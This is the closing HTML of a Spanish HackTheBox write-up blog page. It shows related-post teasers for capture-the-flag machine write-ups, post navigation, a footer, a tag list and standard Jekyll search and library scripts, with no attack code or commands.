                Máquinita Windows de HackTheBox, es de dificultad media. Ganarameos acceso al servicio MSSQL tramitando una petición a un servidor nuestro SMB obtendremos el hash NTLMv2 de un usuario, nos conectam...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/metatwo-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1679328000"
    data-df="YYYY-MM-DD"
    >
  2023-03-20
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>MetaTwo WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Hoy toca compremeter la máquina MetaTwo de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de  Word Press, usando dicha vulnerabilidad podemos dumpear ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/shoppy-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673625600"
    data-df="YYYY-MM-DD"
    >
  2023-01-13
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shoppy WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la esc...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/stocker-writeup/" class="btn btn-outline-primary"
    prompt="Anterior">
    <p>Stocker WriteUp</p>
  </a>
  

  
  <a href="/posts/agile-writeup/" class="btn btn-outline-primary"
    prompt="Nuevo">
    <p>Agile WriteUp</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>



        <!-- The Footer -->

<footer class="row pl-3 pr-3">
  <div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0">
    <div class="footer-left">
      <p class="mb-0">
        © 2023
        <a href="https://twitter.com/mortzelo">H4ckerLite</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Hecho con 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         usando el tema 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
        .

      </p>
    </div>

  </div>

</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
    
      
      <a class="post-tag" href="/tags/medium/">medium</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
    
      
      <a class="post-tag" href="/tags/dc/">DC</a>
    
      
      <a class="post-tag" href="/tags/windows/">windows</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Actualizar
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

